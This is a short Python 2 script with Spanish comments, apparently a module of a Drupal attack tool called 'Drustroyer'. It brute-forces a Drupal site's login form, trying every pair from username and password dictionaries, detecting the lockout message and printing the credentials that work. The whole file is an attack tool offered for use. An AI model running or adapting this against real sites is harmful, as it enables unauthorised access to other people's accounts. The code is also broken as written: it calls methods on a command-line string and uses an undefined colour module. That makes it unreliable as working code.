#!/usr/bin/python
'''
BRUTE.PY

Autor: FCG.

Este script de python esta optimizado para funcionar con la herramienta Drustroyer.

Requiere de dos diccionarios, uno de usuarios y uno de contrasenas. Los cuales deben ser ubicados en el
directorio de scripts en el punto de instalacion de la herramienta.

Disfruta ;)
'''

import requesocks
import requests
import sys
import os
import re

usrlist = [line.rstrip('\n') for line in open(os.getcwd()+'/script/dependencias/usuarios.txt')]
pswlist = [line.rstrip('\n') for line in open(os.getcwd()+'/script/dependencias/passwords.txt')]

req,target = sys.argv[1],sys.argv[2]
if req.get(target+'/user/login').status_code == 200 and 'password' in req.get(target+'/user/login').text:
	print colors.green('\n[**] ')+"Pagina para ingreso de usuarios:\n\t %s/user/login\n"%target
	url = target+'/user/login'
elif req.get(target+'/?q=user/login').status_code == 200 and 'password' in req.get(target+'/?q=user/login').text:
	print colors.green('\n[**] ')+"Pagina para ingreso de usuarios:\n\t %s/?q=user/login\n"%target
	url = target+'/?q=user/login'

ValidCredentials =[]
for user in usrlist:
	for pwd in pswlist:
		data = {"name": user ,"pass": pwd, "form_id":"user_login"}
		print "Probando: "+user+" "+pwd;
		html = req.post(url, data=data)
		htmltext = html.text
		if re.findall(re.compile('Sorry, too many failed login attempts|Try again later'),htmltext):
			msg = "Tu IP ha sido bloqueada por Drupal. Reinicia el servicio o intenta en otro equipo"
			print msg
		try:
			if html.history:
				if html.history[0].status_code in range(299,404):
					ValidCredentials.append([user,pwd])
					req.cookies.clear()
		except Exception as e:
			print e
for d in ValidCredentials:
	print "Credenciales validas halladas: "+d[0]+" "+d[1];